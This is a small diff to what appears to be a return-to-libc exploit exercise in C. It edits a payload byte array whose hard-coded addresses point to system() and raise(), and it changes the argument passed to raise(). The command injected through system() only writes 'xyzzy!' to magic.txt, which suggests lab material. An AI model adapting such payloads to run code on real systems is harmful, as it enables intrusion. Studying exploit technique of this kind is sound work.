@@ -26,7 +26,7 @@ unsigned char payload[] =
 	"\x40\x20\xe2\xb3" //0xb3e23040 <system> 0xb3e22040 0xb3e22040
 	"\x40\x1d\xe1\xb3" // 0xb3e12d40 <raise> 0xb3e11d40
 	"\x29\xc3\xff\xbf" // <system arg> pointer to string 0xbfffc329
-	"\x0d" // <raise> argument
+	"\x0c" // <raise> argument
 	"echo -n xyzzy! > magic.txt\x0";
 
 
